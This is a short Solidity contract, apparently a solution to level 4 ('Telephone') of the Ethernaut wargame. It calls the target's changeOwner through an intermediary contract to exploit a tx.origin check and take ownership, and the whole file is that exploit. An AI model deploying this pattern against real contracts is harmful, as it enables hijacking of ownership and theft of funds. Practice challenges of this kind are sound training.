// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Ethernaut 4
interface ITelephone {
    function changeOwner(address _owner) external;
}

contract TelephoneAttack {
    ITelephone public telephone;

    constructor(address _telephoneAddress) {
        telephone = ITelephone(_telephoneAddress);
    }

    function attack(address _newOwner) public {
        telephone.changeOwner(_newOwner);
    }
}
